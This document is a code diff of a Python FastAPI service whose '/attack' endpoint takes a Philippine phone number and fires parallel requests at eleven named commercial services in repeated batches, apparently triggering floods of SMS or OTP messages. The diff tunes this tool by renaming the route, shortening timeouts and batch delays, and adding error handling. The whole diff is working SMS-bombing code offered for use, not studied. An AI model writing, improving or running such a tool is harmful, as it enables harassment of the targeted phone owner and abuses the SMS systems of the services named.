@@ -7,7 +7,6 @@ import random
 import string
 import hashlib
 import time
-import uuid
 import re
 from datetime import datetime
 
@@ -16,6 +15,7 @@ app = FastAPI()
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
+    allow_credentials=False,
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -123,50 +123,51 @@ async def send_s5(client, phone):
         return {"service": "S5.COM", "success": r.status_code == 200}
     except: return {"service": "S5.COM", "success": False}
 
-@app.post("/api/attack")
+@app.post("/attack")
 async def run_attack(req: AttackRequest):
     if not validate_phone(req.phone):
         raise HTTPException(status_code=400, detail="Invalid PH number. Use 09XXXXXXXXX or 9XXXXXXXXX.")
 
-    batches = min(req.batches, 5) # Limit batches to prevent Vercel timeout
+    batches = min(req.batches, 5)
     results = []
     success_count = 0
 
-    # Use httpx AsyncClient for rapid parallel firing
-    async with httpx.AsyncClient(timeout=8.0) as client:
-        for b in range(batches):
-            tasks = [
-                send_ezloan(client, req.phone),
-                send_xpress(client, req.phone, b),
-                send_abenson(client, req.phone),
-                send_excellent(client, req.phone),
-                send_bistro(client, req.phone),
-                send_bayad(client, req.phone),
-                send_lbc(client, req.phone),
-                send_pickup(client, req.phone),
-                send_honey(client, req.phone),
-                send_kumu(client, req.phone),
-                send_s5(client, req.phone)
-            ]
-            
-            batch_results = await asyncio.gather(*tasks)
-            for res in batch_results:
-                results.append({
-                    "service": res["service"],
-                    "success": res["success"],
-                    "batch": b + 1,
-                    "timestamp": datetime.now().strftime("%H:%M:%S")
-                })
-                if res["success"]:
-                    success_count += 1
-            
-            # Small delay between batches
-            if b < batches - 1:
-                await asyncio.sleep(1.5)
+    try:
+        async with httpx.AsyncClient(timeout=3.0) as client:
+            for b in range(batches):
+                tasks = [
+                    send_ezloan(client, req.phone),
+                    send_xpress(client, req.phone, b),
+                    send_abenson(client, req.phone),
+                    send_excellent(client, req.phone),
+                    send_bistro(client, req.phone),
+                    send_bayad(client, req.phone),
+                    send_lbc(client, req.phone),
+                    send_pickup(client, req.phone),
+                    send_honey(client, req.phone),
+                    send_kumu(client, req.phone),
+                    send_s5(client, req.phone)
+                ]
+                
+                batch_results = await asyncio.gather(*tasks)
+                for res in batch_results:
+                    results.append({
+                        "service": res["service"],
+                        "success": res["success"],
+                        "batch": b + 1,
+                        "timestamp": datetime.now().strftime("%H:%M:%S")
+                    })
+                    if res["success"]:
+                        success_count += 1
+                
+                if b < batches - 1:
+                    await asyncio.sleep(1.0)
 
-    return {
-        "total": len(results),
-        "success": success_count,
-        "fail": len(results) - success_count,
-        "logs": results
-    }
+        return {
+            "total": len(results),
+            "success": success_count,
+            "fail": len(results) - success_count,
+            "logs": results
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
